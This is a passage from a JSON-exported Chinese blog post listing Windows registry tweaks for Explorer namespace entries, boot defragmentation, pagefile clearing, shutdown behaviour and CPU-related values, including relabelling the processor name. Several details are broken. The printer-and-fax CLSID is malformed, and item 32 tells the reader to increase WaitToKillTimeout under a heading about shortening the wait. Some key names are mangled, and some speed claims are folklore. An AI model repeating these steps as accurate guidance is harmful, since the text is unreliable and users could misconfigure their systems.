Folders<br>键值：Templates<br>修改：把要改到的路径添上就可以了</p>\n<p>28、在我的电脑中显示网络连接<br>位置：HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\MyComputer\\NameSpace<br>新建子项：{992CFFA0-F557-101A-88EC-00DD010CCC48}<br>修改默认值：网络连接</p>\n<p>29、在我的电脑中显示打印机和传真<br>位置：HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\MyComputer\\NameSpace<br>新建子项：{2227A280-3AEA-1069-A2DE-08002B3039D}<br>修改默认值：打印机和传真</p>\n<p>30、打开或关闭启动优化功能（启动时碎片整理）<br>位置：HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Dfrg\\BootOptimizeFunction<br>键值：Enable<br>修改：Y开启N不开启</p>\n<p>31、加快程序运行速度(需要重启)<br>位置：HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\FileSystem<br>新建值项：configfileallocsize<br>值：1f4</p>\n<p>32、缩短关闭无响应程序的等待时间（需重启）<br>位置：HKEY_USERS.DEFAULT\\Control Panel\\Desktop<br>值项：WaitToKillTimeout<br>修改：增大一点可以加快处理程序的速度</p>\n<p>33、关机时自动删除交换文件<br>位置：HKEY_LOCAL_MACHINE\\SYSTEM\\ControlSet001\\Control\\Session Manager\\Memory Management<br>值：ClearPageFileAtShutdown<br>修改：1</p>\n<p>34、自动关闭计算机（指关机后停在关机界面）<br>位置：HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows<br>NT\\CurrentVersion\\Winlogon<br>值：PowerdownAfterShutdown<br>修改：1</p>\n<h2 id=\"第十五课-硬件设置\"><a href=\"#第十五课-硬件设置\" class=\"headerlink\" title=\"第十五课  硬件设置\"></a>第十五课  硬件设置</h2><p>1、启用CPU的二级缓存（需重启）<br>位置：HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Session Manager\\Memory Management<br>值项：secondleveldatacache<br>修改：我改成了200了，你呢</p>\n<p>2、修改认证标识（拥有个性化的CPU）<br>位置：HKEY_LOCAL_MACHINE\\HARDWARE\\DEscriptION\\System\\CentralProcessor\\0<br>值项：ProcessorNameString<br>修改：随便改，改成了奔8CPU,9.99GHZ主频</p>\n<p>3、更改系统属性对话框里的CPU信息<br>位置：HKEY_LOCAL_MACHINE\\HARDWARE\\DEscriptION\\System\\CentralProcessor\\0<br>值项：VendorIdentifer<br>修改：随便改</p>\n<p>4、清除内存中不使用的DLL文件（需重启）<br>位置：HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer<br>新建值项：Always UnloadDll<br>(REG-DWORD)值：1</p>\n<p>5、启动自动优化磁盘功能（需重启）<br>位置：HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Dfrg\\BootOptimizeFunction<br>值项：Enable<br>修改：Yes</p>\n",
            "tags": [
                "转载",
                "基础"
            ]
        }
    ]
}